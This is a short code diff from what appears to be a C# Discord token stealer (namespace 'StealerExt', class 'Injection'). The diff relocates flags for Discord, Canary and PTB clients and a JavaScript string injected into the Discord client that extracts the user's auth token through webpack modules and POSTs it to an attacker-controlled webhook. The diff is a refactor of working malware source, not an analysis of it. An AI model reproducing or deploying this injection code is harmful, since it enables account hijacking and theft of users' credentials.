@@ -8,11 +8,6 @@ namespace StealerExt
 {
     internal class Injection
     {
-        private static bool Discord = false;
-        private static bool DiscordCan = false;
-        private static bool DiscordPTB = false;
-        private static readonly string StringToInject = "var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[[\"extra_id\"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)\"getToken\"===e&&(token=r.default.getToken())}; var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send(`{\"content\": \"${token}\"}`);";
-        
         public static void StartInjection()
         {
             try
@@ -120,5 +115,9 @@ namespace StealerExt
                 catch { }
             }
         }
+        private static bool Discord;
+        private static bool DiscordCan;
+        private static bool DiscordPTB;
+        private static readonly string StringToInject = "var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[[\"extra_id\"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)\"getToken\"===e&&(token=r.default.getToken())}; var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send(`{\"content\": \"${token}\"}`);";
     }
 }
